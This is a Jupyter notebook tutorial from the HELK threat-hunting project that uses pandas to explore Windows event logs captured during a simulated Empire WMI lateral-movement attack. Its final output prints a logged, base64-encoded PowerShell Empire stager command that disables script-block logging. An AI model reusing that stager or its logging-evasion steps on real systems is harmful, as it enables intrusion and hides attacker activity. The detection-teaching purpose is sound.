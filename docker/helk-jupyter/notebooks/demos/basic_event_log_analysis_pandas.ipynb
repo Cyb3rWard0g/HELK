{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Basic Event Log Analysis with Pandas**\n",
    "----------------------------------------------------------------------------\n",
    "## Goals:\n",
    "* Learn how to read a security event log in JSON format\n",
    "* Explore the data and run a few filters\n",
    "* Plot basic charts using dataframes and matplotlib"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Import Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "from pandas.io.json import json_normalize\n",
    "import json\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "invoke_wmi_df = pd.read_json('datasets/empire_invoke_wmi_2019-05-18214442.json', lines=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>@timestamp</th>\n",
       "      <th>@metadata</th>\n",
       "      <th>type</th>\n",
       "      <th>event_id</th>\n",
       "      <th>event_data</th>\n",
       "      <th>log_name</th>\n",
       "      <th>source_name</th>\n",
       "      <th>level</th>\n",
       "      <th>task</th>\n",
       "      <th>computer_name</th>\n",
       "      <th>...</th>\n",
       "      <th>keywords</th>\n",
       "      <th>beat</th>\n",
       "      <th>host</th>\n",
       "      <th>version</th>\n",
       "      <th>thread_id</th>\n",
       "      <th>activity_id</th>\n",
       "      <th>process_id</th>\n",
       "      <th>user</th>\n",
       "      <th>provider_guid</th>\n",
       "      <th>user_data</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>0</td>\n",
       "      <td>2019-05-18T21:44:40.083Z</td>\n",
       "      <td>{'beat': 'winlogbeat', 'type': 'doc', 'version...</td>\n",
       "      <td>wineventlog</td>\n",
       "      <td>800</td>\n",
       "      <td>{'param2': '\tDetailSequence=1\n",
       "\tDetailTotal=1\n",
       "\n",
       "...</td>\n",
       "      <td>Windows PowerShell</td>\n",
       "      <td>PowerShell</td>\n",
       "      <td>Information</td>\n",
       "      <td>Pipeline Execution Details</td>\n",
       "      <td>IT001.shire.com</td>\n",
       "      <td>...</td>\n",
       "      <td>[Classic]</td>\n",
       "      <td>{'name': 'WECserver', 'hostname': 'WECserver',...</td>\n",
       "      <td>{'name': 'WECserver'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1</td>\n",
       "      <td>2019-05-18T21:44:40.083Z</td>\n",
       "      <td>{'beat': 'winlogbeat', 'type': 'doc', 'version...</td>\n",
       "      <td>wineventlog</td>\n",
       "      <td>800</td>\n",
       "      <td>{'param1': '        $IV=[BitConverter]::GetByt...</td>\n",
       "      <td>Windows PowerShell</td>\n",
       "      <td>PowerShell</td>\n",
       "      <td>Information</td>\n",
       "      <td>Pipeline Execution Details</td>\n",
       "      <td>IT001.shire.com</td>\n",
       "      <td>...</td>\n",
       "      <td>[Classic]</td>\n",
       "      <td>{'name': 'WECserver', 'hostname': 'WECserver',...</td>\n",
       "      <td>{'name': 'WECserver'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>2</td>\n",
       "      <td>2019-05-18T21:44:40.083Z</td>\n",
       "      <td>{'beat': 'winlogbeat', 'type': 'doc', 'version...</td>\n",
       "      <td>wineventlog</td>\n",
       "      <td>800</td>\n",
       "      <td>{'param1': '            0..255 | ForEach-Objec...</td>\n",
       "      <td>Windows PowerShell</td>\n",
       "      <td>PowerShell</td>\n",
       "      <td>Information</td>\n",
       "      <td>Pipeline Execution Details</td>\n",
       "      <td>IT001.shire.com</td>\n",
       "      <td>...</td>\n",
       "      <td>[Classic]</td>\n",
       "      <td>{'hostname': 'WECserver', 'version': '6.7.0', ...</td>\n",
       "      <td>{'name': 'WECserver'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>3</td>\n",
       "      <td>2019-05-18T21:44:40.083Z</td>\n",
       "      <td>{'beat': 'winlogbeat', 'type': 'doc', 'version...</td>\n",
       "      <td>wineventlog</td>\n",
       "      <td>800</td>\n",
       "      <td>{'param1': '                                $5...</td>\n",
       "      <td>Windows PowerShell</td>\n",
       "      <td>PowerShell</td>\n",
       "      <td>Information</td>\n",
       "      <td>Pipeline Execution Details</td>\n",
       "      <td>IT001.shire.com</td>\n",
       "      <td>...</td>\n",
       "      <td>[Classic]</td>\n",
       "      <td>{'name': 'WECserver', 'hostname': 'WECserver',...</td>\n",
       "      <td>{'name': 'WECserver'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>4</td>\n",
       "      <td>2019-05-18T21:44:40.083Z</td>\n",
       "      <td>{'beat': 'winlogbeat', 'type': 'doc', 'version...</td>\n",
       "      <td>wineventlog</td>\n",
       "      <td>800</td>\n",
       "      <td>{'param1': '                                $s...</td>\n",
       "      <td>Windows PowerShell</td>\n",
       "      <td>PowerShell</td>\n",
       "      <td>Information</td>\n",
       "      <td>Pipeline Execution Details</td>\n",
       "      <td>IT001.shire.com</td>\n",
       "      <td>...</td>\n",
       "      <td>[Classic]</td>\n",
       "      <td>{'name': 'WECserver', 'hostname': 'WECserver',...</td>\n",
       "      <td>{'name': 'WECserver'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 23 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                 @timestamp  \\\n",
       "0  2019-05-18T21:44:40.083Z   \n",
       "1  2019-05-18T21:44:40.083Z   \n",
       "2  2019-05-18T21:44:40.083Z   \n",
       "3  2019-05-18T21:44:40.083Z   \n",
       "4  2019-05-18T21:44:40.083Z   \n",
       "\n",
       "                                           @metadata         type  event_id  \\\n",
       "0  {'beat': 'winlogbeat', 'type': 'doc', 'version...  wineventlog       800   \n",
       "1  {'beat': 'winlogbeat', 'type': 'doc', 'version...  wineventlog       800   \n",
       "2  {'beat': 'winlogbeat', 'type': 'doc', 'version...  wineventlog       800   \n",
       "3  {'beat': 'winlogbeat', 'type': 'doc', 'version...  wineventlog       800   \n",
       "4  {'beat': 'winlogbeat', 'type': 'doc', 'version...  wineventlog       800   \n",
       "\n",
       "                                          event_data            log_name  \\\n",
       "0  {'param2': '\tDetailSequence=1\n",
       "\tDetailTotal=1\n",
       "\n",
       "...  Windows PowerShell   \n",
       "1  {'param1': '        $IV=[BitConverter]::GetByt...  Windows PowerShell   \n",
       "2  {'param1': '            0..255 | ForEach-Objec...  Windows PowerShell   \n",
       "3  {'param1': '                                $5...  Windows PowerShell   \n",
       "4  {'param1': '                                $s...  Windows PowerShell   \n",
       "\n",
       "  source_name        level                        task    computer_name  ...  \\\n",
       "0  PowerShell  Information  Pipeline Execution Details  IT001.shire.com  ...   \n",
       "1  PowerShell  Information  Pipeline Execution Details  IT001.shire.com  ...   \n",
       "2  PowerShell  Information  Pipeline Execution Details  IT001.shire.com  ...   \n",
       "3  PowerShell  Information  Pipeline Execution Details  IT001.shire.com  ...   \n",
       "4  PowerShell  Information  Pipeline Execution Details  IT001.shire.com  ...   \n",
       "\n",
       "    keywords                                               beat  \\\n",
       "0  [Classic]  {'name': 'WECserver', 'hostname': 'WECserver',...   \n",
       "1  [Classic]  {'name': 'WECserver', 'hostname': 'WECserver',...   \n",
       "2  [Classic]  {'hostname': 'WECserver', 'version': '6.7.0', ...   \n",
       "3  [Classic]  {'name': 'WECserver', 'hostname': 'WECserver',...   \n",
       "4  [Classic]  {'name': 'WECserver', 'hostname': 'WECserver',...   \n",
       "\n",
       "                    host version thread_id activity_id  process_id  user  \\\n",
       "0  {'name': 'WECserver'}     NaN       NaN         NaN         NaN   NaN   \n",
       "1  {'name': 'WECserver'}     NaN       NaN         NaN         NaN   NaN   \n",
       "2  {'name': 'WECserver'}     NaN       NaN         NaN         NaN   NaN   \n",
       "3  {'name': 'WECserver'}     NaN       NaN         NaN         NaN   NaN   \n",
       "4  {'name': 'WECserver'}     NaN       NaN         NaN         NaN   NaN   \n",
       "\n",
       "  provider_guid  user_data  \n",
       "0           NaN        NaN  \n",
       "1           NaN        NaN  \n",
       "2           NaN        NaN  \n",
       "3           NaN        NaN  \n",
       "4           NaN        NaN  \n",
       "\n",
       "[5 rows x 23 columns]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "invoke_wmi_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "pandas.core.frame.DataFrame"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(invoke_wmi_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Explore File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(5271, 23)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "invoke_wmi_df.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                                2019-05-18T21:44:40.083Z\n",
       "@metadata        {'beat': 'winlogbeat', 'type': 'doc', 'version...\n",
       "type                                                   wineventlog\n",
       "event_id                                                       800\n",
       "event_data       {'param2': '\tDetailSequence=1\n",
       "\tDetailTotal=1\n",
       "\n",
       "...\n",
       "log_name                                        Windows PowerShell\n",
       "source_name                                             PowerShell\n",
       "level                                                  Information\n",
       "task                                    Pipeline Execution Details\n",
       "computer_name                                      IT001.shire.com\n",
       "opcode                                                        Info\n",
       "message          Pipeline execution details for command line:  ...\n",
       "record_number                                                 3295\n",
       "keywords                                                 [Classic]\n",
       "beat             {'name': 'WECserver', 'hostname': 'WECserver',...\n",
       "host                                         {'name': 'WECserver'}\n",
       "version                                                        NaN\n",
       "thread_id                                                      NaN\n",
       "activity_id                                                    NaN\n",
       "process_id                                                     NaN\n",
       "user                                                           NaN\n",
       "provider_guid                                                  NaN\n",
       "user_data                                                      NaN\n",
       "Name: 0, dtype: object"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "invoke_wmi_df.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Flatten Nested Columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "json_struct = json.loads(invoke_wmi_df.to_json(orient=\"records\"))\n",
    "invoke_wmi_flat = json_normalize(json_struct)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                   2019-05-18T21:44:40.083Z\n",
       "type                                      wineventlog\n",
       "event_id                                          800\n",
       "log_name                           Windows PowerShell\n",
       "source_name                                PowerShell\n",
       "                                       ...           \n",
       "event_data.SupportInfo1                           NaN\n",
       "event_data.SupportInfo2                           NaN\n",
       "event_data.ProcessingMode                         NaN\n",
       "event_data.TaskName                               NaN\n",
       "event_data.TaskContentNew                         NaN\n",
       "Name: 0, Length: 172, dtype: object"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "invoke_wmi_flat.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Data Sources Available"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "source_name\n",
       "Microsoft-Windows-GroupPolicy             1\n",
       "Microsoft-Windows-PowerShell            711\n",
       "Microsoft-Windows-Security-Auditing     535\n",
       "Microsoft-Windows-Sysmon               3180\n",
       "Microsoft-Windows-WMI-Activity            3\n",
       "PowerShell                              841\n",
       "dtype: int64"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "invoke_wmi_flat.groupby(['source_name']).size()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Filter on Sysmon Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon_filter = invoke_wmi_flat['source_name'] == \"Microsoft-Windows-Sysmon\"\n",
    "sysmon_df = invoke_wmi_flat[sysmon_filter]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                               2019-05-18T21:44:40.105Z\n",
       "type                                                  wineventlog\n",
       "event_id                                                       12\n",
       "log_name                     Microsoft-Windows-Sysmon/Operational\n",
       "source_name                              Microsoft-Windows-Sysmon\n",
       "                                             ...                 \n",
       "event_data.SupportInfo1                                       NaN\n",
       "event_data.SupportInfo2                                       NaN\n",
       "event_data.ProcessingMode                                     NaN\n",
       "event_data.TaskName                                           NaN\n",
       "event_data.TaskContentNew                                     NaN\n",
       "Name: 21, Length: 172, dtype: object"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_df.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Filter on Process Creation Events (EID 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon_filter2 = sysmon_df['event_id'] == 1\n",
    "sysmon_proc_create = sysmon_df[sysmon_filter2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                               2019-05-18T21:44:57.732Z\n",
       "type                                                  wineventlog\n",
       "event_id                                                        1\n",
       "log_name                     Microsoft-Windows-Sysmon/Operational\n",
       "source_name                              Microsoft-Windows-Sysmon\n",
       "                                             ...                 \n",
       "event_data.SupportInfo1                                       NaN\n",
       "event_data.SupportInfo2                                       NaN\n",
       "event_data.ProcessingMode                                     NaN\n",
       "event_data.TaskName                                           NaN\n",
       "event_data.TaskContentNew                                     NaN\n",
       "Name: 354, Length: 172, dtype: object"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_proc_create.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Drop Empty Fields on Process Create Dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon_proc_create = sysmon_proc_create.dropna(axis = 1, how = 'all')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                                               2019-05-18T21:44:57.732Z\n",
       "type                                                                  wineventlog\n",
       "event_id                                                                        1\n",
       "log_name                                     Microsoft-Windows-Sysmon/Operational\n",
       "source_name                                              Microsoft-Windows-Sysmon\n",
       "level                                                                 Information\n",
       "task                                         Process Create (rule: ProcessCreate)\n",
       "computer_name                                                     IT001.shire.com\n",
       "opcode                                                                       Info\n",
       "message                         Process Create:\\nRuleName: \\nUtcTime: 2019-05-...\n",
       "record_number                                                             2996367\n",
       "version                                                                         5\n",
       "thread_id                                                                    2136\n",
       "process_id                                                                   2508\n",
       "provider_guid                              {5770385f-c22a-43e0-bf4c-06f5698ffbd9}\n",
       "@metadata.beat                                                         winlogbeat\n",
       "@metadata.type                                                                doc\n",
       "@metadata.version                                                           6.7.0\n",
       "@metadata.topic                                                        winlogbeat\n",
       "host_name                                                               WECserver\n",
       "beat.hostname                                                           WECserver\n",
       "beat.version                                                                6.7.0\n",
       "host.name                                                               WECserver\n",
       "user.domain                                                          NT AUTHORITY\n",
       "user.type                                                                    User\n",
       "user.identifier                                                          S-1-5-18\n",
       "user.name                                                                  SYSTEM\n",
       "event_data.UtcTime                                        2019-05-18 21:44:57.730\n",
       "event_data.ProcessGuid                     {aa6b4a20-7cd9-5ce0-0000-0010a3801e00}\n",
       "event_data.ProcessId                                                         1900\n",
       "event_data.Image                       C:\\Windows\\System32\\backgroundTaskHost.exe\n",
       "event_data.User                                                    SHIRE\\pgustavo\n",
       "event_data.Product                           Microsoft® Windows® Operating System\n",
       "event_data.IntegrityLevel                                            AppContainer\n",
       "event_data.TerminalSessionId                                                    1\n",
       "event_data.Hashes               SHA1=339E4E69D2120B97CE34B9A8D3597FF8E0A73561,...\n",
       "event_data.CurrentDirectory     C:\\Windows\\SystemApps\\Microsoft.Windows.Conten...\n",
       "event_data.LogonId                                                        0x9fa53\n",
       "event_data.Company                                          Microsoft Corporation\n",
       "event_data.ParentProcessGuid               {aa6b4a20-7719-5ce0-0000-001068a30000}\n",
       "event_data.ParentImage                            C:\\Windows\\System32\\svchost.exe\n",
       "event_data.LogonGuid                       {aa6b4a20-79fe-5ce0-0000-002053fa0900}\n",
       "event_data.ParentCommandLine     C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p\n",
       "event_data.FileVersion                        10.0.17763.1 (WinBuild.160101.0800)\n",
       "event_data.ParentProcessId                                                    716\n",
       "event_data.Description                                       Background Task Host\n",
       "event_data.CommandLine          \"C:\\Windows\\system32\\backgroundTaskHost.exe\" -...\n",
       "Name: 354, dtype: object"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_proc_create.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Group By Specific Fields"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "event_data.ParentImage\n",
       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe     2\n",
       "C:\\Windows\\System32\\gpupdate.exe                              1\n",
       "C:\\Windows\\System32\\services.exe                              1\n",
       "C:\\Windows\\System32\\svchost.exe                              10\n",
       "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe                         1\n",
       "C:\\Windows\\System32\\winlogon.exe                              1\n",
       "dtype: int64"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_proc_create.groupby(['event_data.ParentImage']).size()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Enrich Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon_proc_create['command_count'] = sysmon_proc_create['event_data.CommandLine'].str.len()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "@timestamp                                               2019-05-18T21:44:58.050Z\n",
       "type                                                                  wineventlog\n",
       "event_id                                                                        1\n",
       "log_name                                     Microsoft-Windows-Sysmon/Operational\n",
       "source_name                                              Microsoft-Windows-Sysmon\n",
       "level                                                                 Information\n",
       "task                                         Process Create (rule: ProcessCreate)\n",
       "computer_name                                                     IT001.shire.com\n",
       "opcode                                                                       Info\n",
       "message                         Process Create:\\nRuleName: \\nUtcTime: 2019-05-...\n",
       "record_number                                                             2996477\n",
       "version                                                                         5\n",
       "thread_id                                                                    2136\n",
       "process_id                                                                   2508\n",
       "provider_guid                              {5770385f-c22a-43e0-bf4c-06f5698ffbd9}\n",
       "@metadata.beat                                                         winlogbeat\n",
       "@metadata.type                                                                doc\n",
       "@metadata.version                                                           6.7.0\n",
       "@metadata.topic                                                        winlogbeat\n",
       "host_name                                                               WECserver\n",
       "beat.hostname                                                           WECserver\n",
       "beat.version                                                                6.7.0\n",
       "host.name                                                               WECserver\n",
       "user.domain                                                          NT AUTHORITY\n",
       "user.type                                                                    User\n",
       "user.identifier                                                          S-1-5-18\n",
       "user.name                                                                  SYSTEM\n",
       "event_data.UtcTime                                        2019-05-18 21:44:58.048\n",
       "event_data.ProcessGuid                     {aa6b4a20-7cda-5ce0-0000-0010db921e00}\n",
       "event_data.ProcessId                                                         4624\n",
       "event_data.Image                            C:\\Windows\\System32\\RuntimeBroker.exe\n",
       "event_data.User                                                    SHIRE\\pgustavo\n",
       "event_data.Product                           Microsoft® Windows® Operating System\n",
       "event_data.IntegrityLevel                                                  Medium\n",
       "event_data.TerminalSessionId                                                    1\n",
       "event_data.Hashes               SHA1=EE8FDECE70D4D64D2C422E3F6861E066E85BD139,...\n",
       "event_data.CurrentDirectory                                  C:\\Windows\\system32\\\n",
       "event_data.LogonId                                                        0x9fa53\n",
       "event_data.Company                                          Microsoft Corporation\n",
       "event_data.ParentProcessGuid               {aa6b4a20-7719-5ce0-0000-001068a30000}\n",
       "event_data.ParentImage                            C:\\Windows\\System32\\svchost.exe\n",
       "event_data.LogonGuid                       {aa6b4a20-79fe-5ce0-0000-002053fa0900}\n",
       "event_data.ParentCommandLine     C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p\n",
       "event_data.FileVersion                        10.0.17763.1 (WinBuild.160101.0800)\n",
       "event_data.ParentProcessId                                                    716\n",
       "event_data.Description                                             Runtime Broker\n",
       "event_data.CommandLine           C:\\Windows\\System32\\RuntimeBroker.exe -Embedding\n",
       "command_count                                                                  48\n",
       "Name: 464, dtype: object"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_proc_create.iloc[1]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Visualize Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f3ab934b860>"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "sysmon_proc_create.plot(kind='bar',x='event_data.ParentImage',y='command_count')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Filter On Interesting Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "780    {aa6b4a20-7cde-5ce0-0000-00109ea71e00}\n",
       "Name: event_data.ProcessGuid, dtype: object"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sysmon_filter3 = sysmon_proc_create['event_data.ParentImage'] == \"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\"\n",
    "sysmon_proc_create[sysmon_filter3]['event_data.ProcessGuid']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon_filter4 = sysmon_proc_create['event_data.ProcessGuid'] ==\"{aa6b4a20-7cde-5ce0-0000-00109ea71e00}\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Display Results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "780    C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwBSAEUAZgBdAC4AQQBTAFMARQBtAGIATAB5AC4ARwBFAFQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAGYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEARgAuAEcAZQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJABGADAAOQBBAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAZgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAEwAPQBbAEMATwBsAEwARQBjAHQASQBvAG4AUwAuAEcARQBuAEUAcgBpAGMALgBEAEkAYwBUAGkAbwBuAGEAUgB5AFsAUwB0AHIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAEUAYwBUAF0AXQA6ADoATgBlAFcAKAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAEYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAGwAfQBFAGwAUwBFAHsAWwBTAGMAcgBpAHAAdABCAGwATwBDAEsAXQAuACIARwBFAHQARgBJAGUAYABsAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBsAFUARQAoACQAbgB1AEwAb...\n",
      "Name: event_data.CommandLine, dtype: object\n"
     ]
    }
   ],
   "source": [
    "with pd.option_context('display.max_colwidth', 2000):\n",
    "    print(sysmon_proc_create[sysmon_filter4]['event_data.CommandLine'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
